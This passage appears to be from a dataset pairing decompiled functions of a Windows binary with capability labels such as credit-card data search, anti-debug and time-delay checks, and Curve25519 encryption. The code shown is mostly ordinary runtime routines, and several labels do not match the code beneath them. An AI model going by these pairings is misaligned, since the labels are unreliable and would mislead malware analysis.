        "decompiled_code": "\nint32_t fcn.0042ed3a(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00444bc2();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 46
    },
    "0041c056": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint8_t fcn.0041c056(uint32_t param_1)\n\n{\n    if (*0x4685cc <= param_1) {\n        return 0;\n    }\n    return *(*((param_1 >> 5) * 4 + 0x4685e0) + 4 + (param_1 & 0x1f) * 0x24) & 0x40;\n}\n",
        "token_count": 91
    },
    "0041fdc6": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041fdc6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00412580(0x457e58, 8);\n    uVar2 = *(unaff_EBP + 8);\n    iVar1 = *((uVar2 >> 5) * 4 + 0x4685e0) + (uVar2 & 0x1f) * 0x24;\n    if (*(iVar1 + 8) == 0) {\n        fcn.00416625(10);\n        *(unaff_EBP + -4) = 0;\n        if (*(iVar1 + 8) == 0) {\n            iVar3 = fcn.0041c315(iVar1 + 0xc, 4000);\n            if (iVar3 == 0) {\n                fcn.00410d32(unaff_EBP + -0x10, 0xffffffff);\n                goto code_r0x0041fe54;\n            }\n            *(iVar1 + 8) = *(iVar1 + 8) + 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041fe5d();\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((uVar2 >> 5) * 4 + 0x4685e0) + 0xc + (uVar2 & 0x1f) * 0x24);\ncode_r0x0041fe54:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 397
    },
    "0041fe66": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0041fe66(uint32_t param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((param_1 >> 5) * 4 + 0x4685e0) + 0xc + (param_1 & 0x1f) * 0x24);\n    return;\n}\n",
        "token_count": 76
    },
    "004200cb": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004200cb(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint dwMoveMethod)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_10h;\n    iVar2 = fcn.0041fd85(arg_8h);\n    if (iVar2 == -1) {\n        puVar3 = fcn.004131f5();\n        *puVar3 = 9;\ncode_r0x00420125:\n        iVar2 = -1;\n        lpDistanceToMoveHigh = 0xffffffff;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar2, arg_ch, &lpDistanceToMoveHigh, dwMoveMethod);\n        if (iVar2 == -1) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar4 != 0) {\n                fcn.00413207(iVar4);\n                goto code_r0x00420125;\n            }\n        }\n        puVar1 = *((arg_8h >> 5) * 4 + 0x4685e0) + 4 + (arg_8h & 0x1f) * 0x24;\n        *puVar1 = *puVar1 & 0xfd;\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar2);\n}\n",
        "token_count": 343
    },
    "00434c84": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00434c84(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0043240e": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0043240e(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint8_t in_stack_fffffeb8;\n    uchar auStack324 [8];\n    uchar auStack316 [8];\n    uchar auStack308 [12];\n    uint32_t uStack296;\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1),  iVar1 < 0x104)) {\n        iVar1 = fcn.00431946(param_2 + 0x22, param_1);\n        if (iVar1 == 0) {\n            *(param_2 + 0x22) = 0;\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(param_1, &stack0xfffffeb8);\n            if (iVar1 != -1) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar1);\n                *(param_2 + 8) = in_stack_fffffeb8 & 0x7f;\n                param_2[6] = uStack296;\n                param_2[7] = uStack296 >> 0x1f;\n                puVar2 = fcn.0040fb6c(auStack324, 0xffffffff);\n                *param_2 = *puVar2;\n                param_2[1] = puVar2[1];\n                puVar2 = fcn.0040fb6c(auStack316, 0xffffffff);\n                param_2[4] = *puVar2;\n                param_2[5] = puVar2[1];\n                puVar2 = fcn.0040fb6c(auStack308, 0xffffffff);\n                param_2[2] = *puVar2;\n                param_2[3] = puVar2[1];\n                if ((*param_2 | param_2[1]) == 0) {\n                    *param_2 = *puVar2;\n                    param_2[1] = puVar2[1];\n                }\n                if ((param_2[4] | param_2[5]) == 0) {\n                    param_2[4] = param_2[2];\n                    param_2[5] = param_2[3];\n                }\n            }\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 564
    },
    "0043e54f": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043e54f(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arg_10h;\n    uint uStack292;\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x1c), &stack0xfffffecc);\n    if (*(param_2 + 0x88) == param_1) {\n        if (param_3 == 0) goto code_r0x0043e7a3;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(&stack0xfffffecc, param_3);\n        if (iVar2 != 0) goto code_r0x0043e7a3;\n    }\n    if ((*(param_1 + 0x90) != 0) && ((*(param_2 + 0x80) & 0x40) != 0)) {\n        *(param_1 + 0x7c) = *(param_1 + 0x7c) | 0x40;\n    }\n    *(param_1 + 0x7c) = *(param_1 + 0x7c) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x7c);\n    *(param_1 + 0x7c) = *(param_2 + 0x7c) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0042e498(auStack268, 0x104);\n        fcn.00434b8c(*(param_1 + 0x1c), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x7c) ^ *(param_1 + 0x7c)) & 0xf000 ^ *(param_2 + 0x7c);\n    if (*(param_1 + 0x90) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00448452(uVar3);\n    bVar1 = false;\n    if (*(param_2 + 0x88) != param_1) {\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_2 + 0x1c));\n        if (iVar2 != 0) {\n            fcn.0042e037(0, 0, 0, 0, 0, 0x97);\n            bVar1 = true;\n        }\n    }\n    uStack292 = 0xffffffff;\n    if (param_3 == 0) {\n        fcn.004277fb(*(param_1 + 0x9c), param_2);\n        fcn.004277fb(*(param_1 + 0x9c), 0);\n        fcn.0042e037(0, -*0x466db8, -*0x466dbc, 0, 0, 0x115);\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, param_3);\n        fcn.00433413(&iStack284);\n        uStack292 = fcn.0043db58(param_2, iStack284, iStack280, iStack276, iStack272, \n                                 (iStack276 - iStack284) / 2 + iStack284, (iStack272 - iStack280) / 2 + iStack280);\n        fcn.0042e037(0, iStack284, iStack280, iStack276 - iStack284, iStack272 - iStack280, 0x114);\n    }\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x1c));\n    iVar2 = fcn.0042b432();\n    if (iVar2 != param_1) {\n        fcn.00410567(param_1);\n    }\n    iVar2 = *(param_2 + 0x88);\n    if (iVar2 == param_1) {\n        arg_10h = 0;\ncode_r0x0043e76e:\n        fcn.0043dee0(param_2, uStack292, arg_10h);\n    }\n    else if (iVar2 != 0) {\n        if ((*(param_1 + 0x90) == 0) || (*(iVar2 + 0x90) != 0)) {\n            arg_10h = 0;\n        }\n        else {\n            arg_10h = 1;\n        }\n        uStack292 = 0xffffffff;\n        goto code_r0x0043e76e;\n    }\n    *(param_2 + 0x88) = param_1;\n    if (bVar1) {\n        fcn.0042e037(0, 0, 0, 0, 0, 0x57);\n    }\n    fcn.0043de79(param_2);\n    iVar2 = fcn.0043fbce();\n    *(iVar2 + 0xcc) = *(iVar2 + 0xcc) | 0xc;\ncode_r0x0043e7a3:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1259
    },
    "00417da8": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.00417da8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x46894c == 0) {\n        fcn.00412f63();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x467074;\n    if (*0x467074 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.00411cb0(pcVar3);\n        }\n        piVar1 = fcn.0041101f(iVar4 * 4 + 4);\n        pcVar3 = *0x467074;\n        *0x4670a8 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.00411031(*0x467074);\n                    *0x467074 = NULL;\n                    *piVar1 = 0;\n                    *0x468940 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.00411cb0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.0041101f(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.00411031(*0x4670a8);\n                        *0x4670a8 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.004190f0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 437
    },
    "0041c876": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuchar * fcn.0041c876(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar5 = *0x464bf0;\n    var_4h = 0;\n    puVar7 = *0x464bf0 + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar1 = fcn.00411cb0(puVar7[0xc]);\n        iVar2 = fcn.00411cb0(*puVar7);\n        var_4h = iVar2 + var_4h + 2 + iVar1;\n        puVar7 = puVar7 + 1;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    puVar3 = fcn.0041101f(var_4h + 1);\n    if (puVar3 != NULL) {\n        puVar7 = iVar5 + 0x68;\n        iVar5 = 0xc;\n        puVar6 = puVar3;\n        do {\n            *puVar6 = 0x3a;\n            puVar6 = puVar6 + 1;\n            uVar4 = fcn.004190f0(puVar6, puVar7[-0xc]);\n            iVar1 = fcn.00411cb0(uVar4);\n            puVar6 = puVar6 + iVar1;\n            *puVar6 = 0x3a;\n            uVar4 = fcn.004190f0(puVar6 + 1, *puVar7);\n            iVar1 = fcn.00411cb0(uVar4);\n            puVar6 = puVar6 + 1 + iVar1;\n            puVar7 = puVar7 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n        *puVar6 = 0;\n    }\n    return puVar3;\n}\n",
        "token_count": 478
    },
    "0042800f": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0042800f(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = 0;\n    if (param_1 != NULL) goto code_r0x00428027;\n    uVar3 = fcn.00422e61();\n    uVar2 = extraout_ECX;\n    do {\n        iVar1 = uVar3 * 0x21 + uVar2;\n        param_1 = (uVar3 >> 0x20) + 1;\ncode_r0x00428027:\n        uVar3 = CONCAT44(param_1, iVar1);\n        uVar2 = *param_1;\n    } while (*param_1 != 0);\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "00401ef0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401ef0(uint8_t *param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    float fVar3;\n    float fVar4;\n    float fVar5;\n    float fVar6;\n    float fVar7;\n    float fVar8;\n    uint32_t uVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint8_t uVar12;\n    uint8_t uStack17;\n    \n    if (*(param_1 + 0x14) == 0) {\n        uVar1 = param_1[1];\n        uVar2 = param_1[2];\n        uVar11 = uVar1;\n        if (uVar2 <= uVar1) {\n            uVar11 = uVar2;\n        }\n        uVar10 = *param_1;\n        uStack17 = uVar10;\n        if (((uVar11 <= uVar10) && (uStack17 = uVar2,  uVar11 = uVar1,  uVar1 < uVar2)) ||\n           (uVar12 = uVar1,  uVar11 = uStack17,  uVar1 <= uVar2)) {\n            uStack17 = uVar11;\n            uVar12 = uVar2;\n        }\n        if ((uVar10 <= uVar12) && (uVar10 = uVar1,  uVar1 <= uVar2)) {\n            uVar10 = uVar2;\n        }\n        uVar9 = uVar10;\n        fVar3 = uVar9 - uStack17;\n        fVar4 = uStack17 + uVar9;\n        fVar5 = *0x44e538 * fVar4;\n        *(param_1 + 0xc) = fVar5;\n        if (uVar10 == uStack17) {\n            *(param_1 + 8) = 0;\n            *(param_1 + 4) = 0;\n            *(param_1 + 0x14) = 1;\n            return;\n        }\n        fVar6 = *0x44e534 / fVar3;\n        fVar7 = (uVar9 - *param_1) * fVar6;\n        fVar8 = (uVar9 - uVar1) * fVar6;\n        fVar6 = (uVar9 - param_1[2]) * fVar6;\n        if (fVar5 < *0x44e530 == (fVar5 == *0x44e530)) {\n            fVar4 = *0x44e52c - fVar4;\n        }\n        *(param_1 + 8) = fVar3 / fVar4;\n        if (*param_1 == uVar10) {\n            *(param_1 + 4) = ((fVar6 + *0x44e528) - fVar8) * *0x44e524;\n        }\n        if (uVar1 == uVar10) {\n            *(param_1 + 4) = ((fVar7 + *0x44e520) - fVar6) * *0x44e524;\n        }\n        if (param_1[2] == uVar10) {\n            *(param_1 + 4) = ((fVar8 + *0x44e51c) - fVar7) * *0x44e524;\n        }\n        if (((*(param_1 + 4) < *0x44e518) << 8 | (*(param_1 + 4) == *0x44e518) << 0xe) == 0) {\n            *(param_1 + 4) = *(param_1 + 4) - *0x44e518;\n        }\n        *(param_1 + 0x14) = 1;\n    }\n    return;\n}\n",
        "token_count": 847
    },
    "00405f00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00405f00(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    iVar3 = *param_2;\n    iVar4 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    ppiVar5 = iVar4 + -0x10;\n    if (ppiVar1 != ppiVar5) {\n        piVar2 = iVar4 + -4;\n        if ((-1 < *(iVar4 + -4)) && (*ppiVar1 == *ppiVar5)) {\n            iVar4 = fcn.00401900(ppiVar1);\n            LOCK();\n            iVar3 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n            if (iVar3 == 1 || iVar3 + -1 < 0) {\n                (**(**ppiVar5 + 4))(ppiVar5);\n            }\n            *param_1 = iVar4 + 0x10;\n            return param_1;\n        }\n        fcn.00401b10(iVar3, *(iVar3 + -0xc));\n    }\n    return param_1;\n}\n",
        "token_count": 295
    },
    "0040e1c1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e1c1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = fcn.00411e15(arg_8h);\n    puVar1 = fcn.0040e027(&var_24h, 10000);\n    var_ch = *puVar1;\n    var_8h = puVar1[1];\n    var_4h = puVar1[2];\n    if (arg_8h < 0) {\n        puVar1 = fcn.0040dfe1(&var_24h);\n        var_ch = *puVar1;\n        var_8h = puVar1[1];\n        var_4h = puVar1[2];\n    }\n    var_18h = fcn.00411e15(arg_ch);\n    if (arg_ch < 0) {\n        puVar1 = fcn.0040dfe1(&var_24h);\n        var_18h = *puVar1;\n        var_14h = puVar1[1];\n        var_10h = puVar1[2];\n    }\n    uVar2 = fcn.0040ded7(&var_24h, &var_18h);\n    fcn.0040cce7(uVar2);\n    *(in_ECX + 8) = 0;\n    return;\n}\n",
        "token_count": 405
    },
    "0040e741": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl\nfcn.0040e741(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_ch)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    code **ppcVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint16_t *puVar8;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h_2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    puVar8 = *(unaff_EBP + 0xc);\n    uVar2 = *puVar8;\n    *(unaff_EBP + -0x14) = *0x4640c8;\n    *(unaff_EBP + -0x10) = &var_30h;\n    if (uVar2 != 0) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar8);\n    }\n    uVar6 = *(unaff_EBP + 8);\n    fcn.0040dca8(puVar8);\n    if ((*puVar8 & 0x6000) != 0) goto code_r0x0040e84b;\n    // switch table (22 cases) at 0x40e968\n    switch(*puVar8) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        fcn.0040dca8(puVar8 + 4);\n        break;\n    case 3:\n    case 10:\n        puVar8 = puVar8 + 4;\n        goto code_r0x0040e7ba;\n    case 4:\n        fcn.0040dd2d(puVar8 + 4);\n        break;\n    case 5:\n    case 7:\n        fcn.0040dd6f(puVar8 + 4);\n        break;\n    case 6:\n        fcn.0040dceb(puVar8 + 4);\n        puVar8 = puVar8 + 6;\ncode_r0x0040e7ba:\n        fcn.0040ddb1(puVar8);\n        break;\n    case 8:\n        fcn.0040dceb(unaff_EBP + 8);\n        if (*(unaff_EBP + 8) == 0) {\n            *(puVar8 + 4) = 0;\n        }\n        else {\n            iVar7 = (*_sym.imp.OLEAUT32.dll_DllRegisterServer)(0, *(unaff_EBP + 8));\n            *(puVar8 + 4) = iVar7;\n            if (iVar7 == 0) {\n                iVar7 = fcn.00422e2d();\n            }\n            fcn.00434e3d(iVar7, *(unaff_EBP + 8));\n        }\n        break;\n    case 9:\n    case 0xd:\n        *(unaff_EBP + -0x28) = 0;\n        fcn.00424d44(uVar6);\n        fcn.0040dceb(unaff_EBP + -0x24);\n        fcn.0040dca8(unaff_EBP + -0x20);\n        fcn.0040dca8(unaff_EBP + -0x1e);\n        fcn.00434e3d(unaff_EBP + -0x1c, 8);\n        pcVar5 = _sym.imp.ole32.dll_CoCreateInstance;\n        uVar6 = 0x459c1c;\n        if (*puVar8 != 0xd) {\n            uVar6 = 0x459bac;\n        }\n        puVar1 = puVar8 + 4;\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(unaff_EBP + -0x24, 0, 0x17, uVar6, puVar1);\n        if (iVar7 == -0x7ff8ffa9) {\n            uVar6 = 0x459c1c;\n            if (*puVar8 != 0xd) {\n                uVar6 = 0x459bac;\n            }\n            iVar7 = (*pcVar5)(unaff_EBP + -0x24, 0, 7, uVar6, puVar1);\n        }\n        fcn.0040c68e(iVar7);\n        puVar3 = *puVar1;\n        ppcVar4 = *puVar3;\n        *(unaff_EBP + -4) = 0;\n        iVar7 = (**ppcVar4)(puVar3, 0x45a32c, unaff_EBP + -0x28);\n        if (iVar7 < 0) {\n            iVar7 = (****puVar1)(*puVar1, 0x459d8c, unaff_EBP + -0x28);\n        }\n        fcn.0040c68e(iVar7);\n        uVar6 = (**(**(unaff_EBP + -0x28) + 0x14))(*(unaff_EBP + -0x28), unaff_EBP + -0x30);\n        fcn.0040c68e(uVar6);\n        iVar7 = **(unaff_EBP + -0x28);\n        *(unaff_EBP + -4) = 0xffffffff;\n        (**(iVar7 + 8))(*(unaff_EBP + -0x28));\n        break;\n    case 0x10:\n    case 0x11:\n        fcn.0040dbd9(puVar8 + 4);\n        break;\n    case 0x13:\n        fcn.0040dceb(puVar8 + 4);\n        break;\n    case 0x14:\n        fcn.0040dc18(puVar8 + 4);\n        break;\n    case 0x15:\n        fcn.0040dc60(puVar8 + 4);\n    }\ncode_r0x0040e84b:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1535
    },
    "004112a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004112a0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "004113d5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004113d5(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.00412746(*0x468948);\n    if (uVar1 < *0x468944 + (4 - *0x468948)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.00411e9b(*0x468948, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00411e9b(*0x468948, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x468944 = iVar2 + (*0x468944 - *0x468948 >> 2) * 4;\n        *0x468948 = iVar2;\n    }\n    **0x468944 = unaff_EDI;\n    *0x468944 = *0x468944 + 1;\n    return;\n}\n",
        "token_count": 270
    },
    "00414a56": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414a56(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041b78f(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.0041b65e((0 < arg_10h) + (var_2ch == 0x2d) + arg_ch, arg_10h + 1, &var_2ch);\n    fcn.004149a8(arg_10h, arg_14h, 0);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 193
    },
    "00414b5e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414b5e(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041b78f(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.0041b65e((var_2ch == 0x2d) + arg_ch, var_28h + arg_10h, &var_2ch);\n    fcn.00414ac2(arg_ch, arg_10h, 0);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 188
    },
    "00414bc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414bc0(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041b78f(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    iVar1 = var_28h + -1;\n    arg_8h_00 = (var_2ch == 0x2d) + arg_ch;\n    fcn.0041b65e(arg_8h_00, arg_10h, &var_2ch);\n    var_28h = var_28h + -1;\n    if ((var_28h < -4) || (arg_10h <= var_28h)) {\n        fcn.004149a8(arg_10h, arg_14h, 1);\n    }\n    else {\n        if (iVar1 < var_28h) {\n            do {\n                pcVar2 = arg_8h_00;\n                arg_8h_00 = pcVar2 + 1;\n            } while (*pcVar2 != '\\0');\n            pcVar2[-1] = '\\0';\n        }\n        fcn.00414ac2(arg_ch, arg_10h, 1);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 371
    },
    "004167a3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.004167a3(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x4686ec;\n    while( true ) {\n        if (*0x4686ec + *0x4686e8 * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "00420590": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
